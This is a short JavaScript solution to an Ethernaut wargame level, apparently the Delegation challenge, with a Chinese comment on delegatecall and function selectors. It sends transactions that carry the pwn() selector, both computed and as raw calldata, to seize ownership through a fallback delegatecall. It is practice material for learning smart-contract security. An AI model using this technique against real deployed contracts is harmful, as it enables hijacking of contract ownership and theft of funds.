// // https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493
// // delegateCall, 函数选择器，前面八位地址，执行该操作。
const pwner = web3.utils.sha3("pwn()").substring(0, 10)
await (web3.eth.sendTransaction)({
  from: player,
  to: instance,
  data: pwner
})

await sendTransaction({
  from: player,
  to: instance,
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
